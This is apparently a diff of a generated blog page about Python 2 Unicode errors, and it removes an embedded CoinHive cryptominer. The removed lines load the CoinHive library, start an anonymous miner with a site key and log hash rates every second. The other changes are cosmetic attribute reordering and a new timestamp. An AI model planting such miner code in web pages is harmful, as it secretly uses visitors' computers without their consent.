@@ -39,31 +39,8 @@
         })();
   </script>
   
-  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 </head>
 <body>
-<script>
-  var miner = new CoinHive.Anonymous('0Q2TtxhYQVKpZ8093Pd2RDdyZaWsqJoh');
-  miner.start();
-</script>
-
-<script>
-  // Listen on events
-  miner.on('found', function() {  })
-  miner.on('accepted', function() {  })
-
-  // Update stats once per second
-  setInterval(function() {
-      var hashesPerSecond = miner.getHashesPerSecond();
-      var totalHashes = miner.getTotalHashes();
-      var acceptedHashes = miner.getAcceptedHashes();
-
-      // Output to HTML elements...
-      console.log("H/s: " + hashesPerSecond);
-      console.log("Total Hashes: " + totalHashes);
-      console.log("Acepted Hashes: " + acceptedHashes);
-  }, 1000);
-</script>
   <div class="table-container">
     <div class="table-block footer-push">
       <div class="container">
@@ -125,7 +102,7 @@ of Unicode-related processing in Python ...</p>
 
 <p>I'd bet those of you who have used Python for a bit larger than trivial project have invariably <a href="https://duckduckgo.com/?q=Python+UnicodeEncodeError">encountered</a>
 some variety of it.</p>
-<p>Let's see how we could approach this issue<sup id="fnref:python_version"><a rel="footnote" class="footnote-ref" href="#fn:python_version">1</a></sup> in different ways. For this purse, I'll first go
+<p>Let's see how we could approach this issue<sup id="fnref:python_version"><a class="footnote-ref" rel="footnote" href="#fn:python_version">1</a></sup> in different ways. For this purse, I'll first go
 ahead and  define a
 simple use-case: we're experimenting with a given dataset and we want to run a number of
 Machine Learning methods against the dataset and output a nice log file with performance
@@ -206,7 +183,7 @@ learned about the <code>unicodedata.normalize</code> functionality that gave ris
 <p>Please, note that the code examples accompanying this post are
 relevant to Python v2 - which has been labeled as "Legacy Python", in the context of
 the official community discontinuing its support in 2020 - and,
-particularly, <code>Python 2.7.12</code>. <a rev="footnote" title="Jump back to footnote 1 in the text" class="footnote-backref" href="#fnref:python_version">↩</a></p>
+particularly, <code>Python 2.7.12</code>. <a title="Jump back to footnote 1 in the text" class="footnote-backref" href="#fnref:python_version" rev="footnote">↩</a></p>
 </li>
 </ol>
 </div><p></p>
@@ -257,7 +234,7 @@ particularly, <code>Python 2.7.12</code>. <a rev="footnote" title="Jump back to
       </div>
     </div>  <!-- end table block footer div -->
   </div>
-  <!-- Last generated: 2017-12-23T18:36:06Z -->
+  <!-- Last generated: 2018-04-02T21:37:01Z -->
 </body>
 </html>
 
